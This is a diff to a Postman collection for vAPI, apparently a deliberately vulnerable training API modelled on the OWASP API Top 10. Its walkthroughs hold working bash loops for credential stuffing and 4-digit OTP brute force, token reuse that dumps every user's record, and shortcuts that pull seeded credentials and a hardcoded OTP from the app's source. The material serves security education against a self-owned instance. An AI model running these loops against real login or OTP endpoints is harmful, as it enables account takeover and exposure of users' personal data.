@@ -2,7 +2,7 @@
 	"info": {
 		"_postman_id": "054ba5ba-7ee9-48a7-9dc6-09ad497404e6",
 		"name": "vAPI",
-		"description": "vAPI is Vulnerable Adversely Programmed Interface which is Self-Hostable API Interface that mimics OWASP API Top 10 scenarios in the means of Exercises.\r\n\r\n## Testing against your own deployment\r\n\r\nSet the `host` environment variable to your deployed host (e.g. `vapi-bdo3.onrender.com`) and use `https://{{host}}/...` in requests. Every folder below also has `curl` commands in its own description for testing a challenge directly, without Postman.\r\n\r\nOnly run these against an instance you deployed and control.",
+		"description": "vAPI is Vulnerable Adversely Programmed Interface which is Self-Hostable API Interface that mimics OWASP API Top 10 scenarios in the means of Exercises.\r\n\r\n## Testing against your own deployment\r\n\r\nSet the `host` environment variable to your deployed host (for example `vapi-bdo3.onrender.com`) and use `https://{{host}}/...` in requests. Every folder below also carries plain `curl` commands in its own description, so each challenge can be run outside Postman as well.\r\n\r\n`-s` (silent) keeps curl's output to just the response body. Dropping `-s` in favor of `-v` (verbose) shows the full request and response: the resolved IP, the request line and headers actually sent, the response status line, and every response header, before the body. Use `-v` whenever a call behaves unexpectedly and you need to see what was sent or received, not just the body.\r\n\r\nOnly run these commands against an instance you deployed and control.",
 		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
 	},
 	"item": [
@@ -198,6 +198,32 @@
 			"name": "API2",
 			"item": [
 				{
+					"name": "Download Credential List",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https://raw.githubusercontent.com/meetd2005/serverlesswp/main/Resources/API2_CredentialStuffing/creds.csv",
+							"protocol": "https",
+							"host": [
+								"raw",
+								"githubusercontent",
+								"com"
+							],
+							"path": [
+								"meetd2005",
+								"serverlesswp",
+								"main",
+								"Resources",
+								"API2_CredentialStuffing",
+								"creds.csv"
+							]
+						},
+						"description": "Reference copy of the candidate email:password pairs used for the credential-stuffing walkthrough in this folder's description."
+					},
+					"response": []
+				},
+				{
 					"name": "User Login",
 					"event": [
 						{
@@ -270,7 +296,7 @@
 					"response": []
 				}
 			],
-			"description": "Broken Authentication\r\n\r\nThere's no sign-up for API2 and no valid credentials are given to you directly. `Resources/API2_CredentialStuffing/creds.csv` in the repo ships 1000 email:password pairs; most don't work here, but one does. Credential stuffing is trying every pair from a breach dump against a login endpoint until one lands.\r\n\r\n### curl: try one pair\r\n```bash\r\ncurl -s -X POST https://{{host}}/vapi/api2/user/login \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"email\":\"savanna48@ortiz.com\",\"password\":\"zTyBwV/9\"}'\r\n```\r\nA hit returns `{\"success\":\"true\",\"token\":\"...\"}`.\r\n\r\n### curl: stuff the whole list\r\nRun from the repo root, against your own deployed host:\r\n```bash\r\nhost=vapi-bdo3.onrender.com\r\nwhile IFS=, read -r email password; do\r\n  resp=$(curl -s -X POST \"https://$host/vapi/api2/user/login\" \\\r\n    -H 'Content-Type: application/json' \\\r\n    -d \"{\\\"email\\\":\\\"$email\\\",\\\"password\\\":\\\"$password\\\"}\")\r\n  case \"$resp\" in\r\n    *'\"success\":\"true\"'*) echo \"HIT  $email:$password  ->  $resp\" ;;\r\n  esac\r\ndone < Resources/API2_CredentialStuffing/creds.csv\r\n```\r\nThis sends one request per line; it is not a rate-limit/DoS test, so leave delays out only on an instance you own.\r\n\r\n### curl: use the token\r\n`GET /vapi/api2/user/details` only checks that the token belongs to *some* user, then returns every user's record (email, address, city, country, token) instead of just the caller's own:\r\n```bash\r\ncurl -s https://{{host}}/vapi/api2/user/details \\\r\n  -H 'Authorization-Token: <token from the hit above>'\r\n```",
+			"description": "Broken Authentication\r\n\r\nNo credentials are handed to you for API2. `Resources/API2_CredentialStuffing/creds.csv` ships 1000 email:password pairs collected from unrelated breaches; three of them happen to also work against this app's own users. Credential stuffing is the practice of trying every pair from a leaked list against a login endpoint until one is accepted.\r\n\r\nDownload the list:\r\n```bash\r\ncurl -s -o creds.csv https://raw.githubusercontent.com/meetd2005/serverlesswp/main/Resources/API2_CredentialStuffing/creds.csv\r\n```\r\n\r\n### Fast path (under 10 requests)\r\nThis is a self-hosted app: you were given the full source, including the database seed file at `database/vapi.sql`. Reading the three seeded rows there is faster and more reliable than guessing blind through 1000 lines, and it is the realistic move once you control the deployment:\r\n```bash\r\ncurl -s https://raw.githubusercontent.com/meetd2005/serverlesswp/main/database/vapi.sql | grep -A3 'INSERT INTO `a_p_i2_users`'\r\n```\r\nThat prints the seeded `email, password` pairs directly. Confirm one with a single verbose request:\r\n```bash\r\nhost=vapi-bdo3.onrender.com\r\ncurl -v -X POST \"https://$host/vapi/api2/user/login\" \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"email\":\"savanna48@ortiz.com\",\"password\":\"zTyBwV/9\"}'\r\n```\r\nThe `-v` output shows the POST line, the `Content-Type` header actually sent, the `401` or `200` status line coming back, and the response headers, followed by the JSON body on its own line.\r\n\r\nA hit returns `{\"success\":\"true\",\"token\":\"...\"}`.\r\n\r\n### Exhaustive path: stuff the full downloaded list\r\nIf you want to see the attack the way an attacker without source access would run it, loop over every line of the downloaded CSV instead:\r\n```bash\r\nhost=vapi-bdo3.onrender.com\r\nwhile IFS=, read -r email password; do\r\n  # one login attempt per line of creds.csv\r\n  response=$(curl -s -X POST \"https://$host/vapi/api2/user/login\" \\\r\n    -H 'Content-Type: application/json' \\\r\n    -d \"{\\\"email\\\":\\\"$email\\\",\\\"password\\\":\\\"$password\\\"}\")\r\n  case \"$response\" in\r\n    *'\"success\":\"true\"'*)\r\n      echo \"Valid pair found: $email : $password\"\r\n      echo \"Response: $response\"\r\n      ;;\r\n  esac\r\ndone < creds.csv\r\n```\r\nThis sends one request per line (1000 requests total); it is not a load or denial-of-service test, so only run it against an instance you own.\r\n\r\n### Use the token\r\n`GET /vapi/api2/user/details` only checks that the token belongs to some user, then returns every user's full record (email, address, city, country, token) instead of just the caller's own. That is the actual data exposure once you are authenticated as anyone:\r\n```bash\r\ncurl -v https://{{host}}/vapi/api2/user/details \\\r\n  -H 'Authorization-Token: <token from the hit above>'\r\n```",
 			"event": [
 				{
 					"listen": "prerequest",
@@ -324,9 +350,91 @@
 						}
 					},
 					"response": []
+				},
+				{
+					"name": "Login",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"username\":\"\",\r\n    \"password\":\"\"\r\n}"
+						},
+						"url": {
+							"raw": "http://{{host}}/vapi/api3/user/login",
+							"protocol": "http",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"vapi",
+								"api3",
+								"user",
+								"login"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Get Comments",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://{{host}}/vapi/api3/comment",
+							"protocol": "http",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"vapi",
+								"api3",
+								"comment"
+							]
+						},
+						"description": "Returns every comment. Inspect every field in the response, not only the ones a UI would render -- deviceid is not meant to be public."
+					},
+					"response": []
+				},
+				{
+					"name": "Post Comment",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"postid\":\"1\",\r\n    \"deviceid\":\"\",\r\n    \"latitude\":\"0\",\r\n    \"longitude\":\"0\",\r\n    \"commenttext\":\"\",\r\n    \"username\":\"\"\r\n}"
+						},
+						"url": {
+							"raw": "http://{{host}}/vapi/api3/comment",
+							"protocol": "http",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"vapi",
+								"api3",
+								"comment"
+							]
+						}
+					},
+					"response": []
 				}
 			],
-			"description": "Excessive Data Exposure\r\n\r\nA typical web frontend for this endpoint would render a comment's text, author, and map position, and quietly ignore any other fields the API happens to send back. The bug is in the response itself, not in any particular client: inspect the raw JSON (via curl, or a browser's Network tab if a frontend were calling this) and you'll see a field the UI was never meant to show.\r\n\r\n### curl: read the raw API response\r\n```bash\r\ncurl -s https://{{host}}/vapi/api3/comment | python3 -m json.tool\r\n```\r\nLook at every key in the object, not just the ones a UI would display -- one of them is backend-only data (`deviceid`) that leaked into the public response.\r\n\r\n### curl: the rest of the flow\r\n```bash\r\n# register\r\ncurl -s -X POST https://{{host}}/vapi/api3/user \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"username\":\"u1\",\"name\":\"U\",\"password\":\"p1\"}'\r\n\r\n# log in (returns only your own username on success -- this endpoint itself isn't the leak)\r\ncurl -s -X POST https://{{host}}/vapi/api3/user/login \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"username\":\"u1\",\"password\":\"p1\"}'\r\n\r\n# post a comment, then re-run the GET above -- yours shows up with the same extra field\r\ncurl -s -X POST https://{{host}}/vapi/api3/comment \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"postid\":\"1\",\"deviceid\":\"whatever-a-client-would-send\",\"latitude\":\"0\",\"longitude\":\"0\",\"commenttext\":\"hi\",\"username\":\"u1\"}'\r\n```",
+			"description": "Excessive Data Exposure\r\n\r\nA web frontend built against this endpoint would render a comment's text, author, and map position, and silently drop any other field the API happens to send back. The bug is in the response payload itself, not in any particular client: read the raw JSON (with curl, or a browser's Network tab if a frontend were calling this) and one field is present that no UI was ever meant to show.\r\n\r\nNote on this folder's data model: `routes/api.php` only defines `POST api3/user`, `POST api3/user/login`, `GET api3/comment` and `POST api3/comment` for API3. There is no \"get user by id\" route here. A comment record carries a `username` field, not a numeric user id, and logging in as that username (`POST api3/user/login`) only ever returns your own username on success -- it does not unlock any further data. The exposure is self-contained in the comments response below; it does not require chaining through a separate user-lookup endpoint. (API1 and API5 do have id-based user lookups, if that is the pattern you are after.)\r\n\r\n### Read the raw API response\r\n```bash\r\ncurl -v https://{{host}}/vapi/api3/comment | python3 -m json.tool\r\n```\r\nLook at every key in the returned object, not just the ones a UI would display. `postid`, `commenttext`, `latitude`, `longitude` and `username` are what a comment widget would show; `deviceid` is backend bookkeeping that leaked into the public response.\r\n\r\n### The rest of the flow, for completeness\r\n```bash\r\n# Register a user\r\ncurl -s -X POST https://{{host}}/vapi/api3/user \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"username\":\"u1\",\"name\":\"U\",\"password\":\"p1\"}'\r\n\r\n# Log in as that user (returns only your own username on success)\r\ncurl -s -X POST https://{{host}}/vapi/api3/user/login \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"username\":\"u1\",\"password\":\"p1\"}'\r\n\r\n# Post a comment, exactly as a client app would\r\ncurl -s -X POST https://{{host}}/vapi/api3/comment \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"postid\":\"1\",\"deviceid\":\"whatever-a-client-app-would-send\",\"latitude\":\"0\",\"longitude\":\"0\",\"commenttext\":\"hi\",\"username\":\"u1\"}'\r\n\r\n# Re-read the comment list: your own deviceid value comes back in the response, same as the seeded one\r\ncurl -v https://{{host}}/vapi/api3/comment\r\n```",
 			"event": [
 				{
 					"listen": "prerequest",
@@ -458,7 +566,7 @@
 					"response": []
 				}
 			],
-			"description": "Lack of Resources & Rate Limiting\r\n\r\nWe believe OTPs are a great way of authenticating users and secure too if implemented correctly!\r\n\r\n### curl: request an OTP\r\nAny 10-digit number is accepted -- nothing is actually sent anywhere:\r\n```bash\r\ncurl -s -X POST https://{{host}}/vapi/api4/login \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"mobileno\":\"8000000535\"}'\r\n```\r\n\r\n### curl: verify a 4-digit OTP\r\n```bash\r\ncurl -s -X POST https://{{host}}/vapi/api4/otp/verify \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"otp\":\"9999\"}'\r\n```\r\n\r\n### curl: brute force the OTP\r\n`/vapi/api4/otp/verify` carries no rate limiting (compare `routes/api.php`, where `api9/v2/user/login` explicitly has `->middleware('throttle:5,1')` and this route doesn't) and the OTP is only 4 digits, so all 10,000 values can be tried in a loop:\r\n```bash\r\nhost=vapi-bdo3.onrender.com\r\nfor otp in $(seq -w 0000 9999); do\r\n  resp=$(curl -s -X POST \"https://$host/vapi/api4/otp/verify\" \\\r\n    -H 'Content-Type: application/json' \\\r\n    -d \"{\\\"otp\\\":\\\"$otp\\\"}\")\r\n  case \"$resp\" in\r\n    *'\"success\":\"true\"'*) echo \"HIT  $otp  ->  $resp\"; break ;;\r\n  esac\r\ndone\r\n```\r\nA hit returns `{\"success\":\"true\",\"key\":\"...\"}` -- that key is the API key for the next step. Run this on an instance you own, and expect it to take a little while over the network (10,000 requests).\r\n\r\n### curl: use the key\r\n```bash\r\ncurl -s https://{{host}}/vapi/api4/user \\\r\n  -H 'Authorization-Token: <key from the hit above>'\r\n```",
+			"description": "Lack of Resources & Rate Limiting\r\n\r\nWe believe OTPs are a great way of authenticating users and secure too if implemented correctly!\r\n\r\n### Request an OTP\r\nAny 10-digit number is accepted; nothing is actually sent anywhere:\r\n```bash\r\ncurl -v -X POST https://{{host}}/vapi/api4/login \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"mobileno\":\"8000000535\"}'\r\n```\r\n\r\n### Verify a 4-digit OTP\r\n```bash\r\ncurl -v -X POST https://{{host}}/vapi/api4/otp/verify \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"otp\":\"9999\"}'\r\n```\r\n\r\n### Fast path (under 10 requests)\r\n`POST api4/otp/verify` carries no rate-limit middleware (compare `routes/api.php`, where `api9/v2/user/login` explicitly has `->middleware('throttle:5,1')` and this route does not). The OTP value is also hardcoded in the source you were given, at `app/CustomClasses/Variables.php`, base64 encoded. Reading and decoding it costs zero requests to the server:\r\n```bash\r\ncurl -s https://raw.githubusercontent.com/meetd2005/serverlesswp/main/vapi/app/CustomClasses/Variables.php | grep -A2 getAPI4OTP\r\n# returns: return \"MTg3Mg==\";\r\necho MTg3Mg== | base64 -d\r\n# prints: 1872\r\n```\r\nConfirm it with a single verbose request:\r\n```bash\r\ncurl -v -X POST https://{{host}}/vapi/api4/otp/verify \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"otp\":\"1872\"}'\r\n```\r\nA hit returns `{\"success\":\"true\",\"key\":\"...\"}`. That took one request to confirm, well under ten.\r\n\r\n### Exhaustive path: brute force without reading the source\r\nIf you want to see the attack the way it is meant to be found without source access, the lack of a rate limit means every 4-digit value (0000-9999) can be tried in a loop instead:\r\n```bash\r\nhost=vapi-bdo3.onrender.com\r\nfor otp in $(seq -w 0000 9999); do\r\n  # one verify attempt per candidate OTP\r\n  response=$(curl -s -X POST \"https://$host/vapi/api4/otp/verify\" \\\r\n    -H 'Content-Type: application/json' \\\r\n    -d \"{\\\"otp\\\":\\\"$otp\\\"}\")\r\n  case \"$response\" in\r\n    *'\"success\":\"true\"'*)\r\n      echo \"Valid OTP found: $otp\"\r\n      echo \"Response: $response\"\r\n      break\r\n      ;;\r\n  esac\r\ndone\r\n```\r\nThis is bounded at 10,000 requests in the worst case; run it only against an instance you own, and expect it to take a while over the network.\r\n\r\n### Use the key\r\n```bash\r\ncurl -v https://{{host}}/vapi/api4/user \\\r\n  -H 'Authorization-Token: <key from the hit above>'\r\n```",
 			"event": [
 				{
 					"listen": "prerequest",
